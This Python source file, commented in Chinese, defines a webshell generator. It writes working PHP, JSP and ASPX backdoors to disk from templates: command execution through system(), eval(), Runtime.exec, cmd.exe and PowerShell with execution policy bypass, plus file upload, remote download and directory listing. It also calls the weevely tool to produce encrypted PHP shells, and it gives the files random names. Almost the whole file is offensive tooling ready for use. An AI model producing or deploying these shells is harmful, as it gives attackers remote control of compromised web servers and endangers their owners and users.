import os
import random
import string
import subprocess
from typing import Optional, Dict, List

class ShellGenerator:
    """Webshell生成器类"""
    
    def __init__(self):
        self.shell_templates = {
            'php': {
                'basic': """<?php
    if(isset($_POST['cmd'])) {
        $cmd = $_POST['cmd'];
        system($cmd);
    }
?>""",
                'eval': """<?php
    if(isset($_POST['code'])) {
        eval($_POST['code']);
    }
?>""",
                'curl': """<?php
    if(isset($_POST['cmd'])) {
        $cmd = $_POST['cmd'];
        system($cmd);
    }
?>""",
                'wget': """<?php
    if(isset($_POST['cmd'])) {
        $cmd = $_POST['cmd'];
        system($cmd);
    }
?>""",
                'file_upload': """<?php
    if(isset($_POST['cmd'])) {
        $cmd = $_POST['cmd'];
        system($cmd);
    }
    if(isset($_FILES['file'])) {
        $uploaddir = './uploads/';
        if (!file_exists($uploaddir)) {
            mkdir($uploaddir, 0777, true);
        }
        $uploadfile = $uploaddir . basename($_FILES['file']['name']);
        if (move_uploaded_file($_FILES['file']['tmp_name'], $uploadfile)) {
            echo "File uploaded successfully to $uploadfile";
        } else {
            echo "Upload failed!";
        }
    }
?>""",
                'weevely': None  # weevely shell将通过generate_weevely_shell方法动态生成
            },
            'jsp': {
                'basic': """<%@ page import="java.io.*" %>
<%
    String cmd = request.getParameter("cmd");
    if(cmd != null) {
        Process p = Runtime.getRuntime().exec(cmd);
        OutputStream os = p.getOutputStream();
        InputStream in = p.getInputStream();
        DataInputStream dis = new DataInputStream(in);
        String disr = dis.readLine();
        while ( disr != null ) {
            out.println(disr);
            disr = dis.readLine();
        }
    }
%>""",
                'download': """<%@ page import="java.net.*,java.io.*" %>
<%
    String url = request.getParameter("url");
    String path = request.getParameter("path");
    if(url != null && path != null) {
        try {
            URL website = new URL(url);
            ReadableByteChannel rbc = Channels.newChannel(website.openStream());
            FileOutputStream fos = new FileOutputStream(path);
            fos.getChannel().transferFrom(rbc, 0, Long.MAX_VALUE);
            out.println("File downloaded to: " + path);
        } catch(Exception e) {
            out.println("Error: " + e.getMessage());
        }
    }
%>""",
                'file_browser': """<%@ page import="java.io.*" %>
<%
    String cmd = request.getParameter("cmd");
    if(cmd != null) {
        Process p = Runtime.getRuntime().exec(cmd);
        OutputStream os = p.getOutputStream();
        InputStream in = p.getInputStream();
        DataInputStream dis = new DataInputStream(in);
        String disr = dis.readLine();
        while ( disr != null ) {
            out.println(disr);
            disr = dis.readLine();
        }
    }
    
    String path = request.getParameter("path");
    if(path != null) {
        File dir = new File(path);
        File[] files = dir.listFiles();
        if(files != null) {
            for(File f: files) {
                out.println(f.getName() + (f.isDirectory() ? "/" : "") + " - " + f.length() + "bytes");
            }
        }
    }
%>"""
            },
            'aspx': {
                'basic': """<%@ Page Language="C#" %>
<%@ Import Namespace="System.Diagnostics" %>
<%@ Import Namespace="System.IO" %>
<script runat="server">
    protected void Page_Load(object sender, EventArgs e)
    {
        string cmd = Request["cmd"];
        if (!string.IsNullOrEmpty(cmd))
        {
            Process p = new Process();
            p.StartInfo.FileName = "cmd.exe";
            p.StartInfo.Arguments = "/c " + cmd;
            p.StartInfo.UseShellExecute = false;
            p.StartInfo.RedirectStandardOutput = true;
            p.Start();
            
            string output = p.StandardOutput.ReadToEnd();
            p.WaitForExit();
            Response.Write(output);
        }
    }
</script>""",
                'powershell': """<%@ Page Language="C#" %>
<%@ Import Namespace="System.Diagnostics" %>
<%@ Import Namespace="System.IO" %>
<script runat="server">
    protected void Page_Load(object sender, EventArgs e)
    {
        string cmd = Request["cmd"];
        if (!string.IsNullOrEmpty(cmd))
        {
            Process p = new Process();
            p.StartInfo.FileName = "powershell.exe";
            p.StartInfo.Arguments = "-ExecutionPolicy Bypass -Command " + cmd;
            p.StartInfo.UseShellExecute = false;
            p.StartInfo.RedirectStandardOutput = true;
            p.Start();
            
            string output = p.StandardOutput.ReadToEnd();
            p.WaitForExit();
            Response.Write(output);
        }
    }
</script>""",
                'file_upload': """<%@ Page Language="C#" %>
<%@ Import Namespace="System.IO" %>
<script runat="server">
    protected void Page_Load(object sender, EventArgs e)
    {
        if (Request.Files.Count > 0)
        {
            try
            {
                string uploadDir = Server.MapPath("./uploads/");
                if (!Directory.Exists(uploadDir))
                    Directory.CreateDirectory(uploadDir);
                    
                HttpPostedFile file = Request.Files[0];
                string fileName = Path.GetFileName(file.FileName);
                string filePath = Path.Combine(uploadDir, fileName);
                file.SaveAs(filePath);
                Response.Write("File uploaded successfully to " + filePath);
            }
            catch (Exception ex)
            {
                Response.Write("Error: " + ex.Message);
            }
        }
    }
</script>"""
            }
        }
        
    def generate_shell(self, shell_type: str, template_type: str = 'basic', 
                      output_dir: str = 'shells', filename: Optional[str] = None,
                      password: Optional[str] = None) -> str:
        """
        生成webshell文件
        
        Args:
            shell_type: shell类型 (php/jsp/aspx)
            template_type: 模板类型 (basic/eval等)
            output_dir: 输出目录
            filename: 文件名（可选）
            password: weevely密码（仅用于weevely类型）
            
        Returns:
            str: 生成的shell文件路径
        """
        if shell_type not in self.shell_templates:
            raise ValueError(f"不支持的shell类型: {shell_type}")
            
        if template_type not in self.shell_templates[shell_type]:
            raise ValueError(f"不支持的模板类型: {template_type}")
            
        # 如果是weevely类型，调用专门的生成方法
        if template_type == 'weevely' and shell_type == 'php':
            if not password:
                raise ValueError("生成weevely shell需要提供密码")
            if not filename:
                filename = ''.join(random.choices(string.ascii_lowercase + string.digits, k=8)) + '.php'
            output_path = os.path.join(output_dir, filename)
            return self.generate_weevely_shell(password, output_path)
            
        if not filename:
            filename = ''.join(random.choices(string.ascii_lowercase + string.digits, k=8))
            filename += f'.{shell_type}'
            
        os.makedirs(output_dir, exist_ok=True)
        output_path = os.path.join(output_dir, filename)
        
        with open(output_path, 'w') as f:
            f.write(self.shell_templates[shell_type][template_type])
            
        return output_path
        
    def generate_weevely_shell(self, password: str, output_path: str) -> str:
        """
        使用weevely工具生成加密的PHP webshell
        
        Args:
            password: weevely shell的密码
            output_path: 输出文件路径
            
        Returns:
            生成的shell文件路径
        """
        try:
            os.makedirs(os.path.dirname(output_path), exist_ok=True)
            cmd = ['weevely', 'generate', password, output_path]
            subprocess.run(cmd, check=True, capture_output=True)
            if os.path.exists(output_path):
                return output_path
            else:
                raise RuntimeError("Weevely shell生成失败")
        except subprocess.CalledProcessError as e:
            raise RuntimeError(f"Weevely命令执行失败: {e.stderr.decode()}")
        except Exception as e:
            raise RuntimeError(f"生成Weevely shell时发生错误: {str(e)}")
        
    def add_template(self, shell_type: str, template_type: str, template_content: str):
        """
        添加新的shell模板
        
        Args:
            shell_type: shell类型
            template_type: 模板类型
            template_content: 模板内容
        """
        if shell_type not in self.shell_templates:
            self.shell_templates[shell_type] = {}
        self.shell_templates[shell_type][template_type] = template_content
        
    def get_available_types(self) -> Dict[str, List[str]]:
        """
        获取所有可用的shell类型和模板类型
        
        Returns:
            Dict[str, List[str]]: shell类型及其对应的模板类型列表
        """
        types = {
            shell_type: list(templates.keys())
            for shell_type, templates in self.shell_templates.items()
        }
        types['weevely'] = ['default']  # weevely只有一种默认类型
        return types 